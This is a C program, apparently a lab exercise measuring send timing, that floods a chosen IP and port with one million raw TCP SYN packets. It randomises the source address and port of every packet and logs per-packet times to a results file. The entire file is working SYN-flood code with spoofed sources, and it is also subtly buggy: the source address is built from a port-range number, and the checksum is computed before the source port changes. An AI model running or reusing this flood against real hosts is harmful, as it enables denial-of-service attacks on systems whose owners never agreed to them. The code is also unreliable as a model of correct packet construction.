#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

struct tcp_pseudo_header {
    struct in_addr src;
    struct in_addr dst;
    uint8_t pad;
    uint8_t proto;
    uint16_t tcp_len;
    struct tcphdr tcp;
};

uint16_t inet_checksum(uint16_t *addr, int len)
{
    int nleft = len;
    int sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void get_avg(int amount_packets){
    FILE *fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    double avg = 0;
    fp = fopen("syns_results_c.txt", "r");
    if (fp == NULL){
        printf("Couldn't find the results file");
        exit(EXIT_FAILURE);
    }

    while ((read = getline(&line, &len, fp)) != -1) {
        // printf("Retrieved line of length %zu:\n", read);
        // printf("%s", line);
        int init_size = strlen(line);
	    char delim[] = ",";

	    char *res_string = strtok(line, delim);
        res_string = strtok(NULL, delim);
        if(res_string != NULL){
            double res = atof(res_string);
            avg+=res;
        }
    }
    if (line)
        free(line);
    avg = avg/amount_packets;
    fclose(fp);

    fp = fopen("syns_results_c.txt", "a");
    fprintf(fp, "\nAverage time for a packet- %lf", avg);
    fclose(fp);
}





int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s dest_ip dest_port\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    int fd;
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        perror("socket()");
        return 1;
    }

    /*
     * Prepare the IP header.
     */
    struct iphdr ip_header = {
        .ihl = 5,
        .version = 4,
        .tos = 0,
        .tot_len = 0, // Filled in by the kernel when left 0
        .id = 0, // Ditto
        .frag_off = 0,
        .ttl = 64,
        .protocol = IPPROTO_TCP,
        .check = 0, // Again, filled in by the kernel
        .saddr = htons((random() % (61000 - 32768 + 1)) + 32768), // Filled later
        .daddr = inet_addr(argv[1]) // Checked for errors below
    };

    if (ip_header.daddr == INADDR_NONE) {
        fprintf(stderr, "Destination IP invalid: %s\n", argv[1]);
        return 1;
    }

    unsigned long dport;
    dport = strtoul(argv[2], NULL, 10);
    if (dport > 65535 || dport == 0) {
        fprintf(stderr, "Destination port invalid: %s\n", argv[2]);
        return 1;
    }
    
    struct tcphdr tcp_header = {
        .source = 0, // Filled later
        .dest = htons(dport),
        .seq = random(),
        .ack_seq = 0,
        .res1 = 0,
        .doff = 5,
        .fin = 0,
        .syn = 1,
        .rst = 0,
        .psh = 0,
        .ack = 0,
        .urg = 0,
        .res2 = 0,
        .window = htons(65535),
        .check = 0, // Filled later
        .urg_ptr = 0
    };

    // Writing to a file
    FILE *fp;
    fp = fopen("syns_results_c.txt", "a");
    clock_t total_begin = clock();


    //Sending one million syn packets
    int limit1 = 100;
    int limit2 = 10000;
    // int limit1 = 10;
    // int limit2 = 10;
    unsigned long packet_number = 0;
      for (int i =0 ; i < limit1; i++ ){
        for(int j = 0; j < limit2; j++){ 
            srand(time(NULL));
            clock_t begin = clock();
            struct tcp_pseudo_header phdr = {
                .src.s_addr = ip_header.saddr,
                .dst.s_addr = ip_header.daddr,
                .pad = 0,
                .proto = ip_header.protocol,
                .tcp_len = sizeof(tcp_header), // No payload, only the header.
                .tcp = tcp_header
            };
            tcp_header.source = htons((random() % (61000 - 32768 + 1)) + 32768);
            tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);

            ip_header.saddr = htons((random() % (61000 - 32768 + 1)) + 32768);
            char packet_buf[sizeof tcp_header + sizeof ip_header];
            memcpy(packet_buf, &ip_header, sizeof ip_header);
            memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);

            struct sockaddr_in sin = {
                .sin_family = AF_INET,
                .sin_addr.s_addr = ip_header.daddr
            };
            if (sendto(fd, packet_buf, sizeof packet_buf, 0, (struct sockaddr *)&sin, sizeof sin) == -1) {
                perror("sendto()");
                return 1;
            }else{
                printf("Packet Send \n");
                clock_t end = clock();
                // The next line outputs the time spent in seconds.
                double time_spent = (double)(end - begin) / CLOCKS_PER_SEC;
                fprintf(fp, "%lu,%lf\n", packet_number, time_spent);
                packet_number ++;
            }
        }
      }
    clock_t total_end = clock();
    double total_time = (double)(total_end - total_begin) / CLOCKS_PER_SEC;
    fprintf(fp, "\nTotal time - %lf", total_time);
    time_t mytime = time(NULL);
    char * time_str = ctime(&mytime);
    time_str[strlen(time_str)-1] = '\0';
    fprintf(fp,"\nCurrent Time : %s", time_str);
    fclose(fp);

    get_avg(limit1*limit2);
    return 0;
}